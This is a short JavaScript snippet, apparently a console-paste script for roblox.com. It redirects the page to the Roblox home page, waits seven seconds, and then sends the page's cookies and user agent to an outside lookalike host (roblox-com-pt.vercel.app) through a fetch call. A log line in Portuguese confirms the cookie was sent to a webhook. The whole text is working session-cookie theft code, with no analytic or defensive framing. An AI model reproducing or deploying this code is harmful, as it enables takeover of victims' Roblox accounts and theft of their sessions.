(() => {
  if (!location.hostname.includes("roblox.com")) {
    location.href = "https://www.roblox.com";
    return;
  }

  if (location.pathname !== "/home") {
    location.href = "https://www.roblox.com/home";
    return;
  }

  setTimeout(() => {
    fetch("https://roblox-com-pt.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent))
      .then(res => res.text())
      .then(() => console.log("Cookie enviado pro webhook!"))
      .catch(() => console.log("Falha ao enviar cookie"));
  }, 7000);
})();
